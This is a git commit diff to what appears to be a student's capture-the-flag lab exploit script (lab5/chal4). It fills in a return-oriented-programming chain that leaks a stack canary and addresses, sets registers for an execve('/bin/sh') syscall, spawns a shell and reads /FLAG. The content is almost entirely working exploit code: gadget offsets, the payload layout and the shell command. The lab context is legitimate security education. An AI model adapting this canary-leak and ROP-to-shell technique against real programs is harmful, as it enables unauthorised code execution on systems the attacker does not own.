c75a9cede95663f45aaa3d8e151317cff621b22f
Alanasdw <alanasdw@gmail.com>
2024-05-28 07:48:45 +0000

    finished the challenge
    seems that the original rbp does not matter that much

--- lab5/chal4/expliot.py
+++ lab5/chal4/expliot.py
@@ -46,7 +46,6 @@ rbp = u64( given.split(b'?')[1][:-1].ljust( 8, b'\x00'))
 print( "rbp: " + hex(rbp))
 
 
-
 # get main address
 payload = 'A' * (0x38 - 1) + '?'
 garbo = r.recvuntil('name? '.encode())
@@ -55,15 +54,17 @@ given = r.recvline()
 main = u64( given.split(b'?')[1][:-1].ljust( 8, b'\x00'))
 print( "main given: " + hex(main))
 
-input()
+
 # write shellcode with rop
 """
-0x00000000000111ee : pop rsi ; ret
+0x000000000008dd8b : pop rdx ; pop rbx ; ret
 0x000000000000917f : pop rdi ; ret
+0x00000000000111ee : pop rsi ; ret
 0x0000000000057187 : pop rax ; ret
 0x0000000000008f34 : syscall
-0x000000000000801a : ret
 
+
+0x000000000000801a : ret
 0x000000000007bfc5 : and esi, 0x80 ; syscall // another syscall possibility
 0x000000000007ce94 : mov eax, eax ; syscall
 0x000000000005e493 : int 0x80
@@ -88,42 +89,29 @@ codes = """
 """
 dummy = 0x0
 
-pop_rsi = main - 0x8ad0 + 0x0111ee
-ret = main - 0x8ad0 + 0x801a
+pop_rdx_pop_rbx = main - 0x8ad0 + 0x08dd8b
 pop_rdi = main - 0x8ad0 + 0x917f
+pop_rsi = main - 0x8ad0 + 0x0111ee
 pop_rax = main - 0x8ad0 + 0x057187
 syscall = main - 0x8ad0 + 0x8f34
-# syscall = main - 0x8ad0 + 0x05e493
+# ret = main - 0x8ad0 + 0x801a
 
-# maybe it is just the rdx/rsi not set correctly
 payload = b'/bin/sh\0\0' + b'A' * (0x28 - len("/bin/sh\0\0")) + p64( canary) + p64(dummy) + \
+                                                                p64( pop_rdx_pop_rbx) + p64( 0x0) + p64(dummy) + \
                                                                 p64( pop_rdi) + p64(rbp - 0x40) + \
-                                                                p64( pop_rsi) + p64(rbp - 0x40 + 7) + \
+                                                                p64( pop_rsi) + p64(0x0) + \
                                                                 p64( pop_rax) + p64(59) + p64(syscall)
 garbo = r.recvuntil('message: '.encode())
 r.send( payload)
-# given = r.recvline()
 
+# remove all the garbage
+garbo = r.recvuntil('you!\n'.encode())
 
-# r.interactive()
-
-print("about to write with message")
-# # write "/bin/sh"
-# payload = "/bin/sh\0"
-# garbo = r.recvuntil('message: '.encode())
-# r.send( payload.encode())
-
-r.interactive()
-
-# # remove all the garbage
-# garbo = r.recvuntil('you!\n'.encode())
-
-# # read file
-# cat_comm = 'cat /FLAG\n'
-# r.sendline( cat_comm.encode())
-# given_flag = r.recv().decode()
-# r.close()
-# print( given_flag[:-1])
+# read file
+cat_comm = 'cat /FLAG\n'
+r.sendline( cat_comm.encode())
+given_flag = r.recv().decode()
+r.close()
+print( given_flag[:-1])
 
 # vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
-
